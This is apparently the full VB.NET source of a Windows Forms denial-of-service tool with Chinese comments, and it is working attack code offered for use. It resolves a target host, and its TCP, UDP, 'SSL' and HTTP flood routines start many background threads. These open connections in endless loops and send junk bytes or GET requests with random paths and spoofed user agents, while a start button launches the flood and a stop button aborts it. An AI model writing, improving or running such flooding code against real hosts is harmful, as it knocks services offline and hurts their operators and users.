Imports System.Net
Imports System.Net.Sockets
Imports System.Text
Public Class Form1
    Dim List As New List(Of Threading.Thread) '將執行緒加入排列
    Private Sub Button3_Click(sender As Object, e As EventArgs) Handles Button3.Click
        Try '用Try判斷
            TextBox5.Text = Dns.GetHostEntry(TextBox1.Text).AddressList(0).ToString '如果主機存在TextBox5會顯示IP
        Catch ex As Exception '如果發生例外
            TextBox5.Text = "NONE" '如果主機不存在TextBox5會顯示NONE
        End Try '結束Try區塊
    End Sub

    Private Sub Button4_Click(sender As Object, e As EventArgs) Handles Button4.Click
        TextBox5.Text = TextBox2.Text 'IP直接顯示到TextBox5
    End Sub
    Function RandomString() As String '建立String函數
        Dim builder As New StringBuilder() '宣告為可變動字串
        Dim random As New Random() '宣告為亂數
        Dim ch As Char '宣告為字元
        For i = 0 To 6 '執行6次
            ch = Convert.ToChar(Convert.ToInt32(Math.Floor(26 * random.NextDouble() + 65))) '加入指派至ch
            builder.Append(ch) '不解釋
        Next
        Return builder.ToString() '傳回builder.ToString()物件
    End Function
    Function RandomUserAgent() As String '建立String函數
        Dim random As New Random '宣告為亂數
        Dim osversions As String() = {"5.1", "6.0", "6.1"} '宣告字串陣列
        Dim oslanguages As String() = {"en-GB", "en-US", "es-ES", "pt-BR", "pt-PT", "sv-SE"} '宣告字串陣列
        Dim version As String = osversions(random.Next(0, osversions.Length - 1))  '不解釋
        Dim language As String = oslanguages(random.Next(0, oslanguages.Length - 1))  '不解釋
        Dim useragent As String = String.Format("Mozilla/5.0 (Windows; U; Windows NT {0}; {1}; rv:1.9.2.17) Gecko/20110420 Firefox/3.6.17", version, language)  '不解釋
        Return useragent '傳回useragent物件
    End Function
    Public Sub TCP() 'TCP 方法(副程式Sub)
        Try
            Do While True
                Dim socket As New Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)
                Dim ip As New IPEndPoint(IPAddress.Parse(TextBox5.Text), TextBox3.Text)
                Dim bytes As Byte() = New Byte(10000) {}
                socket.Connect(ip)
                socket.SendTimeout = Integer.Parse(TextBox6.Text)
                socket.Send(bytes)
            Loop
        Catch ex As Exception
        End Try
    End Sub
    Public Sub UDP() 'UDP 方法(副程式Sub)
        Try
            Do While True
                Dim Socket As New Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp)
                Dim IP As New IPEndPoint(IPAddress.Parse(TextBox5.Text), port:=TextBox3.Text)
                Dim Bytes As Byte() = New Byte(10000) {}
                Socket.Connect(IP)
                Socket.SendTimeout = Integer.Parse(TextBox6.Text)
                Socket.Send(Bytes, SocketFlags.None)
            Loop
        Catch ex As Exception
        End Try
    End Sub
    Dim rsa As System.Security.Cryptography.RSA
    Public Sub SSL() 'SSL 方法(副程式Sub)
        Try
            Do While True
                Dim rsa As New System.Security.Cryptography.RSACryptoServiceProvider(1024)
                Dim socket As New Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)
                Dim g() As Byte = System.Text.Encoding.ASCII.GetBytes(String.Format("GET {0}{1} HTTP/1.1{5}Host: {3}{5}User-Agent: {2}{5}Accept: */*{5}{4}{5}{5}", TextBox4.Text, (RandomString()), RandomUserAgent(), "192.168.1.1", ("Accept-Encoding: gzip, deflate")))
                Dim bytes As Byte() = rsa.EncryptValue(g)
                Dim ip As New IPEndPoint(IPAddress.Parse(TextBox5.Text), TextBox3.Text)
                socket.Connect(ip)
                socket.SendTimeout = Integer.Parse(TextBox6.Text)
                socket.Send(bytes, SocketFlags.None)
            Loop
        Catch ex As Exception
        End Try
    End Sub
    Public Sub HTTP() 'HTTP 方法(副程式Sub)
        Try
            Do While True
                Dim socket As New Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)
                Dim bytes() As Byte = System.Text.Encoding.ASCII.GetBytes(String.Format("GET {0}{1} HTTP/1.1{5}Host: {3}{5}User-Agent: {2}{5}Accept: */*{5}{4}{5}{5}", TextBox4.Text, (RandomString()), RandomUserAgent(), "127.0.0.1", ("Accept-Encoding: gzip, deflate" + Environment.NewLine), Environment.NewLine))
                Dim ip As New IPEndPoint(IPAddress.Parse(TextBox5.Text), TextBox3.Text)
                socket.Connect(ip)
                socket.SendTimeout = Integer.Parse(TextBox6.Text)
                Socket.Send(bytes, SocketFlags.None)
            Loop
        Catch ex As Exception
        End Try
    End Sub
    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        List.Clear()
        Label11.Text = "Send Request..."
        Label11.BackColor = Color.ForestGreen
        If RadioButton1.Checked = True Then '如果選擇RadioButton1
            For i = 0 To TrackBar1.Value - 1
                Dim TCPFlood As New Threading.Thread(AddressOf TCP) '將TCP方法(副程式Sub)加入執行緒
                TCPFlood.IsBackground = True '設定為背景執行緒
                TCPFlood.Start()
                List.Add(TCPFlood) '將TCP方法(副程式Sub)加入排列
            Next
        ElseIf RadioButton2.Checked = True Then '(假如True不成立)選擇RadioButton2
            For i = 0 To TrackBar1.Value - 1
                Dim UDPFlood As New Threading.Thread(AddressOf UDP) '將UDP方法(副程式Sub)加入執行緒
                UDPFlood.IsBackground = True '設定為背景執行緒
                UDPFlood.Start()
                List.Add(UDPFlood) '將UDP方法(副程式Sub)加入排列
            Next
        ElseIf RadioButton3.Checked = True Then '(假如True不成立)選擇RadioButton3
            For i = 0 To TrackBar1.Value - 1
                Dim SSLFlood As New Threading.Thread(AddressOf SSL) '將SSL方法(副程式Sub)加入執行緒
                SSLFlood.IsBackground = True '設定為背景執行緒
                SSLFlood.Start()
                List.Add(SSLFlood) '將SSL方法(副程式Sub)加入排列
            Next
        ElseIf RadioButton4.Checked = True Then '(假如True不成立)選擇RadioButton4
            For i = 0 To TrackBar1.Value - 1
                Dim HTTPFlood As New Threading.Thread(AddressOf HTTP) '將HTTP方法(副程式Sub)加入執行緒
                HTTPFlood.IsBackground = True '設定為背景執行緒
                HTTPFlood.Start()
                List.Add(HTTPFlood) '將HTTP方法(副程式Sub)加入排列
            Next
        End If
    End Sub
    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        For i = 0 To List.Count - 1 '用For迴圈找執行緒
            List(i).Abort() '如果找到將引發ThreadAbortException例外來結束執行緒
        Next '結束For迴圈
        Label11.Text = "None Request..."
        Label11.BackColor = Color.DarkRed
    End Sub
    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load '不解釋
        MsgBox("Wecome to HSELC")
        TextBox5.Enabled = False
    End Sub
End Class
